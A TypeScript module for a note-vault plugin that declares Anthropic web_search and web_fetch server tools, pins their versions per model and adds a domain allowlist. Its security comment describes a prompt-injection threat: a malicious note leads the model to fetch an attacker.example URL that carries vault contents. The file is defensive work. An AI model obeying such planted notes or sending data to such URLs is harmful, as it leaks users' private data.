import type { ToolDefinition } from '../protocol';

/**
 * Anthropic-executed server tools. These are passed in the tools
 * array like custom tools, but Anthropic runs them server-side and
 * emits server_tool_use + web_search_tool_result / web_fetch_tool_result
 * content blocks. The plugin doesn't dispatch them through executeTool.
 *
 * max_uses bounds runaway cost (web_search is ~$0.01/search per
 * Anthropic pricing). It caps one API request at 5 uses, not a whole
 * turn: a turn of N tool steps can make N requests.
 *
 * SECURITY — web_fetch is a prompt-injection exfiltration channel.
 * skald reads vault notes into the model context, and web_fetch lets
 * the model issue an outbound HTTP GET to an arbitrary URL. A malicious
 * note could instruct the model to fetch
 * `https://attacker.example/?leak=<vault contents>`, smuggling private
 * data off-device inside the query string. The plugin executes these
 * tools provider-side with no per-URL approval hook, so the only
 * defenses available at request-construction time are:
 *   1. Don't ship the web tools at all (off-by-default — closes the
 *      channel entirely). Gated by `webToolsEnabled` in buildActiveTools.
 *   2. Constrain web_fetch with Anthropic's native `allowed_domains`
 *      parameter, which Anthropic enforces server-side. See
 *      `applyWebFetchAllowlist` below and docs/security-model.md.
 * The default posture (off vs allowlist vs approval) is an operator
 * decision — this module supports all three; the chosen default lives
 * in DEFAULT_SETTINGS.
 *
 * Version pinning is model-specific:
 *   - claude-haiku-4-5 (and any /haiku/ model id) uses the older
 *     20250305 / 20250910 pins. This is a DEFENSIVE PIN: a 400 was
 *     observed in development when the 20260209 versions were sent to
 *     Haiku — Anthropic does not document this difference, so the root
 *     cause is unclear. Do not remove the special-case without first
 *     verifying that a current Haiku model accepts the 20260209 types.
 *   - All other Anthropic models use the current 20260209 pins.
 *
 * OpenRouter translates both pin sets to its own openrouter:web_search /
 * openrouter:web_fetch form unconditionally, so this version choice is
 * purely an Anthropic-API concern — OpenRouter callers need no special
 * handling.
 */

const HAIKU_SERVER_TOOLS: ToolDefinition[] = [
  {
    type: 'web_search_20250305',
    name: 'web_search',
    max_uses: 5,
  },
  {
    type: 'web_fetch_20250910',
    name: 'web_fetch',
    max_uses: 5,
  },
];

const DEFAULT_SERVER_TOOLS: ToolDefinition[] = [
  {
    type: 'web_search_20260209',
    name: 'web_search',
    max_uses: 5,
  },
  {
    type: 'web_fetch_20260209',
    name: 'web_fetch',
    max_uses: 5,
  },
];

/**
 * Web-fetch guard options. When `allowedDomains` is a non-empty list,
 * the web_fetch tool definition carries Anthropic's native
 * `allowed_domains` parameter — Anthropic restricts fetches to those
 * domains server-side, which neutralises the exfiltration channel even
 * if a malicious note tries to point web_fetch at an attacker URL.
 */
export interface WebFetchGuard {
  /** Domains web_fetch is permitted to fetch from. Empty/undefined → no
   * allow-list restriction (rely on webToolsEnabled gating instead). */
  allowedDomains?: readonly string[];
}

/**
 * Normalise a raw domain list: trim, drop empties, dedupe. Returns
 * undefined when nothing survives so callers can treat "no restriction"
 * and "all-whitespace input" identically (no empty `allowed_domains: []`
 * — Anthropic treats that as "allow nothing", which would silently break
 * every fetch).
 */
function normalizeDomains(
  domains: readonly string[] | undefined,
): string[] | undefined {
  if (!domains) return undefined;
  const cleaned = Array.from(
    new Set(domains.map((d) => d.trim()).filter((d) => d.length > 0)),
  );
  return cleaned.length > 0 ? cleaned : undefined;
}

/**
 * Apply a web-fetch domain guard to a server-tool definition list.
 * Clones the list and augments the web_fetch entry with Anthropic's
 * native `allowed_domains` parameter. Tools other
 * than web_fetch (web_search) are returned unchanged. Pure — does not
 * mutate the input.
 */
export function applyWebFetchAllowlist(
  tools: readonly ToolDefinition[],
  guard: WebFetchGuard,
): ToolDefinition[] {
  const allowed = normalizeDomains(guard.allowedDomains);
  return tools.map((t) =>
    allowed && (t as Record<string, unknown>).name === 'web_fetch'
      ? ({ ...t, allowed_domains: allowed } as ToolDefinition)
      : { ...t },
  );
}

/**
 * Return the correct server-tool declarations for the given model id.
 * Haiku models need the older pin set; everything else gets the current
 * 20260209 pins. When a `guard` is supplied, the web_fetch entry is
 * constrained with Anthropic's native allow-list (server-side
 * enforcement) to close the prompt-injection exfiltration channel.
 */
export function serverToolsForModel(
  model: string,
  guard?: WebFetchGuard,
): ToolDefinition[] {
  const base = /haiku/i.test(model) ? HAIKU_SERVER_TOOLS : DEFAULT_SERVER_TOOLS;
  return guard ? applyWebFetchAllowlist(base, guard) : base;
}

/**
 * Default server tools (20260209 pins). Re-exported for callers that
 * need a static representative set (tests).
 * Live sessions must use serverToolsForModel(model) instead.
 */
export const SERVER_TOOLS: ToolDefinition[] = DEFAULT_SERVER_TOOLS;
